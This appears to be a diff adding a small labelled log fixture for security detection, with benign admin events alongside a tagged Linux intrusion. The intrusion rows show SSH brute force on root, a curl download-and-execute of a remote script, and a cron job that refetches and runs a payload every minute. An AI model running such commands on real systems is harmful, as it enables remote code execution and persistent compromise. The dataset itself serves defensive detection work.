@@ -1,0 +1,10 @@
+Time|Host|User|EventType|SourceIP|Command|Result|Case
+09:00:01|linux-01|alice|SSH_ACCEPTED|198.51.100.20|-|SUCCESS|BENIGN_ADMIN
+09:05:00|linux-02|backup|SUDO|10.0.0.10|/usr/bin/rsync backup|SUCCESS|BENIGN_BACKUP
+09:10:00|linux-33|root|SSH_FAILED|203.0.113.90|-|FAILED|LINUX_ATTACK
+09:10:10|linux-33|root|SSH_FAILED|203.0.113.90|-|FAILED|LINUX_ATTACK
+09:10:20|linux-33|root|SSH_FAILED|203.0.113.90|-|FAILED|LINUX_ATTACK
+09:10:35|linux-33|root|SSH_ACCEPTED|203.0.113.90|-|SUCCESS|LINUX_ATTACK
+09:11:00|linux-33|root|SUDO|203.0.113.90|/bin/bash -c 'curl http://203.0.113.90/a.sh -o /tmp/a.sh && sh /tmp/a.sh'|SUCCESS|LINUX_ATTACK
+09:11:40|linux-33|root|CRON_CREATE|203.0.113.90|* * * * * curl http://203.0.113.90/p.sh -o /tmp/p.sh && sh /tmp/p.sh|SUCCESS|LINUX_ATTACK
+09:30:00|linux-04|dev|SSH_FAILED|198.51.100.30|-|FAILED|BENIGN_MISTYPE
